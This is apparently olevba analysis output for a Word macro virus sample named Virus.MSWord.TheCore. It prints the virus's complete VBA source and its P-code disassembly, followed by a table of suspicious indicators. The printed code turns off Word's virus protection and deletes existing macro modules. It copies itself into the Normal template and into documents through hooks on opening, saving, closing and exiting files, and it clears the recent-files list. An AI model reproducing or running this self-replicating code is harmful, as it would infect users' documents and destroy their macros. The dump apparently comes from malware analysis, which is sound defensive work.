olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheCore
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheCore - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NuclearPower.frm 
in file: Virus.MSWord.TheCore - OLE stream: 'Macros/VBA/NuclearPower'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 











































































































Private Sub CommandButton1_Click()
Unload Me
End Sub

Private Sub Image1_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO The_Core.bas 
in file: Virus.MSWord.TheCore - OLE stream: 'Macros/VBA/The_Core'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'**************************************************
' Author  :  Putranto ILHAM Yazid
' Version :  1.20, September 1998.
' This macro is inspired by DwiGanteng macro virus.
' Special thank's and credit are expressed to him.
'**************************************************

Sub AutoExec()
    Options.VirusProtection = False
    Application.DefaultSaveFormat = ""
    WordBasic.DisableAutoMacros 1
End Sub

Sub AutoOpen()
    Call Infect_Normal_Template
End Sub

Sub Infect_Normal_Template()
    Options.VirusProtection = False
    Application.DefaultSaveFormat = ""
    Set NT = NormalTemplate
    MacroCount = NT.VBProject.VBComponents.Count
    For i = 1 To MacroCount
      NMacr = NT.VBProject.VBComponents(i).Name
      If Left(NMacr, 7) = "Version" Then
        If Val(Right(NMacr, 3)) >= 130 Then Exit Sub
      End If
    Next i
    i = MacroCount
' deletes all modules in Normal Template
    While i > 0
      NMacr = NT.VBProject.VBComponents(i).Name
      If (NMacr <> "ThisDocument") And (NMacr <> "MyUtility") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
      i = i - 1
    Wend
' then infects it with NuclearPower macro virus
    Set AD = ActiveDocument
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="NuclearPower", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="The_Core", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=AD.FullName, _
        Destination:=NT.FullName, Name:="Version130", _
        Object:=wdOrganizerObjectProjectItems
    Application.RecentFiles.Maximum = 9
' immediately saves Normal Template
    On Error GoTo jump1
    Templates(NT.FullName).Save
    GoTo jump2
jump1:
' alternative way of saving Normal Template
    Err.Number = 0
    WordBasic.FileOpen Name:=NT.FullName, AddToMru:=0
    WordBasic.FileClose 1
jump2:
' clear existing MRU list; since we can't intercept open calls there
Dim num$
Dim DlgTOG As Object
    Set DlgTOG = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral DlgTOG
    num$ = WordBasic.[LTrim$](DlgTOG.RecentFileCount)
    DlgTOG.RecentFileCount = 0
    WordBasic.ToolsOptionsGeneral DlgTOG
    DlgTOG.RecentFileCount = WordBasic.Val(num$)
    WordBasic.ToolsOptionsGeneral DlgTOG
End Sub

Sub Infect_Document()
    On Error GoTo endsub ' traps error while exit with no document opened
    Set AD = ActiveDocument
    MacroCount = AD.VBProject.VBComponents.Count
    For i = 1 To MacroCount
      NMacr = AD.VBProject.VBComponents(i).Name
      If Left(NMacr, 7) = "Version" Then
        If Val(Right(NMacr, 3)) >= 130 Then Exit Sub
      End If
    Next i
    i = MacroCount
' deletes all modules in the document
    While i > 0
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr <> "ThisDocument" Then
        Application.OrganizerDelete Source:=AD.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
      i = i - 1
    Wend
' then infects it with NuclearPower macro virus
    Set NT = NormalTemplate
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="NuclearPower", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="The_Core", _
        Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
        Destination:=AD.FullName, Name:="Version130", _
        Object:=wdOrganizerObjectProjectItems
' immediately saves the document as Word97 file format
    AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
endsub:
End Sub

Sub FileClose()
    Call Infect_Normal_Template
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If ActiveDocument.Characters.Count > 1 Then
            yes = MsgBox(prompt:="Do you want to save the changes you made to " + _
            ActiveDocument.FullName + "?", Buttons:=vbYesNoCancel + vbExclamation)
            If yes = vbYes Then
                If Dialogs(wdDialogFileSaveAs).Show <> 0 Then
                    Call Infect_Document
                  Else
                    Exit Sub
                End If
              ElseIf yes = vbNo Then
                ActiveDocument.Saved = True
              Else
                Exit Sub
            End If
        End If
      Else
        Call Infect_Document
    End If
    On Error Resume Next ' traps error while canceling file close
    WordBasic.FileClose
End Sub

Sub FileOpen()
    Call Infect_Normal_Template
    If Dialogs(wdDialogFileOpen).Show <> 0 Then Call Infect_Document
End Sub

Sub FileSave()
    Call Infect_Normal_Template
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If Dialogs(wdDialogFileSaveAs).Show <> 0 Then Call Infect_Document
      Else
        Call Infect_Document
    End If
End Sub

Sub FileSaveAs()
    Call Infect_Normal_Template
    If Dialogs(wdDialogFileSaveAs).Show <> 0 Then Call Infect_Document
End Sub

Sub FileExit()
    Call Infect_Normal_Template
    On Error GoTo jump ' traps error while exit with no document opened
    If InStr(ActiveDocument.FullName, "\") = 0 Then
        If ActiveDocument.Characters.Count > 1 Then
            yes = MsgBox(prompt:="Do you want to save the changes you made to " + _
            ActiveDocument.FullName + "?", Buttons:=vbYesNoCancel + vbExclamation)
            If yes = vbYes Then
                If Dialogs(wdDialogFileSaveAs).Show <> 0 Then
                    Call Infect_Document
                  Else
                    Exit Sub
                End If
              ElseIf yes = vbNo Then
                ActiveDocument.Saved = True
              Else
                Exit Sub
            End If
        End If
      Else
        Call Infect_Document
    End If
jump:
    If (WeekDay(Date) = vbMonday) Or (WeekDay(Date) = vbThursday) Then
        Beep
Rem        NuclearPower.Show
    End If
    WordBasic.FileExit
End Sub

Sub FileNew()
    Call Infect_Normal_Template
    Dialogs(wdDialogFileNew).Show
End Sub

Sub HelpAbout()
    Beep
    NuclearPower.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Version130.bas 
in file: Virus.MSWord.TheCore - OLE stream: 'Macros/VBA/Version130'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' just a dummy module that indicates the version of NuclearPower97
' version 1.20
'
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheCore
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/NuclearPower - 2726 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #108:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Private Sub Image1_Click())
' Line #112:
' Line #113:
' 	EndSub 
' Macros/VBA/The_Core - 9596 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0032 "**************************************************"
' Line #1:
' 	QuoteRem 0x0000 0x0020 " Author  :  Putranto ILHAM Yazid"
' Line #2:
' 	QuoteRem 0x0000 0x0021 " Version :  1.20, September 1998."
' Line #3:
' 	QuoteRem 0x0000 0x0032 " This macro is inspired by DwiGanteng macro virus."
' Line #4:
' 	QuoteRem 0x0000 0x0031 " Special thank's and credit are expressed to him."
' Line #5:
' 	QuoteRem 0x0000 0x0032 "**************************************************"
' Line #6:
' Line #7:
' 	FuncDefn (Sub AutoExec())
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt DefaultSaveFormat 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #11:
' 	EndSub 
' Line #12:
' Line #13:
' 	FuncDefn (Sub AutoOpen())
' Line #14:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Sub Infect_Normal_Template())
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt DefaultSaveFormat 
' Line #20:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #21:
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St MacroCount 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MacroCount 
' 	For 
' Line #23:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #24:
' 	Ld NMacr 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Version"
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld NMacr 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0082 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	Ld MacroCount 
' 	St i 
' Line #29:
' 	QuoteRem 0x0000 0x0027 " deletes all modules in Normal Template"
' Line #30:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #31:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #32:
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0009 "MyUtility"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #33:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i 
' Line #36:
' 	Wend 
' Line #37:
' 	QuoteRem 0x0000 0x002E " then infects it with NuclearPower macro virus"
' Line #38:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #39:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "NuclearPower"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "The_Core"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Version130"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	LitDI2 0x0009 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemSt Maximum 
' Line #43:
' 	QuoteRem 0x0000 0x0022 " immediately saves Normal Template"
' Line #44:
' 	OnError jump1 
' Line #45:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	GoTo jump2 
' Line #47:
' 	Label jump1 
' Line #48:
' 	QuoteRem 0x0000 0x002A " alternative way of saving Normal Template"
' Line #49:
' 	LitDI2 0x0000 
' 	Ld Err 
' 	MemSt Number 
' Line #50:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed New 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0002 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #52:
' 	Label jump2 
' Line #53:
' 	QuoteRem 0x0000 0x0043 " clear existing MRU list; since we can't intercept open calls there"
' Line #54:
' 	Dim 
' 	VarDefn num
' Line #55:
' 	Dim 
' 	VarDefn DlgTOG (As Object)
' Line #56:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd ToolsOptionsGeneral 0x0001 
' 	Set DlgTOG 
' Line #57:
' 	Ld DlgTOG 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #58:
' 	Ld DlgTOG 
' 	MemLd RecentFileCount 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	St num$ 
' Line #59:
' 	LitDI2 0x0000 
' 	Ld DlgTOG 
' 	MemSt RecentFileCount 
' Line #60:
' 	Ld DlgTOG 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #61:
' 	Ld num$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	Ld DlgTOG 
' 	MemSt RecentFileCount 
' Line #62:
' 	Ld DlgTOG 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Sub Infect_Document())
' Line #66:
' 	OnError endsub 
' 	QuoteRem 0x0019 0x002F " traps error while exit with no document opened"
' Line #67:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #68:
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St MacroCount 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MacroCount 
' 	For 
' Line #70:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #71:
' 	Ld NMacr 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "Version"
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld NMacr 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0082 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	Ld MacroCount 
' 	St i 
' Line #76:
' 	QuoteRem 0x0000 0x0024 " deletes all modules in the document"
' Line #77:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	While 
' Line #78:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #79:
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #80:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i 
' Line #83:
' 	Wend 
' Line #84:
' 	QuoteRem 0x0000 0x002E " then infects it with NuclearPower macro virus"
' Line #85:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #86:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "NuclearPower"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #87:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "The_Core"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #88:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Version130"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #89:
' 	QuoteRem 0x0000 0x0035 " immediately saves the document as Word97 file format"
' Line #90:
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #91:
' 	Label endsub 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub FileClose())
' Line #95:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #97:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #98:
' 	LineCont 0x0004 08 00 0C 00
' 	LitStr 0x002C "Do you want to save the changes you made to "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	ParamNamed prompt 
' 	Ld vbYesNoCancel 
' 	Ld vbExclamation 
' 	Add 
' 	ParamNamed Buttons 
' 	ArgsLd MsgBox 0x0002 
' 	St yes 
' Line #99:
' 	Ld yes 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #101:
' 	ArgsCall (Call) Infect_Document 0x0000 
' Line #102:
' 	ElseBlock 
' Line #103:
' 	ExitSub 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Ld yes 
' 	Ld vbNo 
' 	Eq 
' 	ElseIfBlock 
' Line #106:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #107:
' 	ElseBlock 
' Line #108:
' 	ExitSub 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	ElseBlock 
' Line #112:
' 	ArgsCall (Call) Infect_Document 0x0000 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0019 0x0027 " traps error while canceling file close"
' Line #115:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #116:
' 	EndSub 
' Line #117:
' Line #118:
' 	FuncDefn (Sub FileOpen())
' Line #119:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #120:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Infect_Document 0x0000 
' 	EndIf 
' Line #121:
' 	EndSub 
' Line #122:
' Line #123:
' 	FuncDefn (Sub FileSave())
' Line #124:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #125:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #126:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Infect_Document 0x0000 
' 	EndIf 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	ArgsCall (Call) Infect_Document 0x0000 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	EndSub 
' Line #131:
' Line #132:
' 	FuncDefn (Sub FileSaveAs())
' Line #133:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #134:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Infect_Document 0x0000 
' 	EndIf 
' Line #135:
' 	EndSub 
' Line #136:
' Line #137:
' 	FuncDefn (Sub FileExit())
' Line #138:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #139:
' 	OnError jump 
' 	QuoteRem 0x0017 0x002F " traps error while exit with no document opened"
' Line #140:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #142:
' 	LineCont 0x0004 08 00 0C 00
' 	LitStr 0x002C "Do you want to save the changes you made to "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Add 
' 	LitStr 0x0001 "?"
' 	Add 
' 	ParamNamed prompt 
' 	Ld vbYesNoCancel 
' 	Ld vbExclamation 
' 	Add 
' 	ParamNamed Buttons 
' 	ArgsLd MsgBox 0x0002 
' 	St yes 
' Line #143:
' 	Ld yes 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #144:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #145:
' 	ArgsCall (Call) Infect_Document 0x0000 
' Line #146:
' 	ElseBlock 
' Line #147:
' 	ExitSub 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld yes 
' 	Ld vbNo 
' 	Eq 
' 	ElseIfBlock 
' Line #150:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #151:
' 	ElseBlock 
' Line #152:
' 	ExitSub 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	ElseBlock 
' Line #156:
' 	ArgsCall (Call) Infect_Document 0x0000 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	Label jump 
' Line #159:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbMonday 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbThursday 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #160:
' 	ArgsCall Beep 0x0000 
' Line #161:
' 	Rem 0x0019 "        NuclearPower.Show"
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' Line #166:
' 	FuncDefn (Sub FileNew())
' Line #167:
' 	ArgsCall (Call) Infect_Normal_Template 0x0000 
' Line #168:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' Line #171:
' 	FuncDefn (Sub HelpAbout())
' Line #172:
' 	ArgsCall Beep 0x0000 
' Line #173:
' 	Ld NuclearPower 
' 	ArgsMemCall Show 0x0000 
' Line #174:
' 	EndSub 
' Macros/VBA/Version130 - 916 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0041 " just a dummy module that indicates the version of NuclearPower97"
' Line #2:
' 	QuoteRem 0x0000 0x000D " version 1.20"
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

